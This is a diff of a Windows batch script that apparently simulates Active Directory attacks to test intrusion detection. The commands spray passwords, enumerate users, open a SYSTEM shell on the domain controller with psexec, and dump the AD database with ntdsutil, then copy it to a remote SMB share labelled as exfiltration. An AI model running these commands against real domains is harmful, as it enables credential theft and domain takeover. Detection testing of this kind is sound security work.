@@ -61,7 +61,7 @@ powershell.exe "Get-Content -Path .\accounts.txt"
 TIMEOUT /T 120
 
 rem **Account enumerations Reconnaissance
-powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt %mydom% P@ssw0rd!}"
+powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt "%mydom%" P@ssw0rd!}"
 TIMEOUT /T 120
 
 rem **Suspected AS-REP Roasting attack 
@@ -75,7 +75,7 @@ TIMEOUT /T 3
 rem **Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack
 wmic useraccount get name >domainusers.txt
 TIMEOUT /T 10
-powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt %mydom% P@ssw0rd}"
+powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt "%mydom%" P@ssw0rd}"
 TIMEOUT /T 120
 
 rem **Dump Credentials In-Memory
@@ -113,17 +113,13 @@ exit
 TIMEOUT /T 120
 
 rem **Data exfiltration over SMB (PUT name of a directory on your local machine to copy files to)
-PSExec.exe -accepteula \\%mydc%  cmd.exe
-TIMEOUT /T 3
-NTSDUTIL "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
-TIMEOUT /T 3
+psexec.exe -accepteula -s \\%mydc%  cmd.exe
+ntdsutil.exe "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
 copy "c:\windows\mdi\Active Directory" \\aftest2\test
-TIMEOUT /T 3
-rmdir /s /q "c:\windows\mdi"
-TIMEOUT /T 3
 exit
 #esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
 TIMEOUT /T 120
+
 
 rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
 wmic /node:"%mydc%" process call create "net user /delete BadGuy"
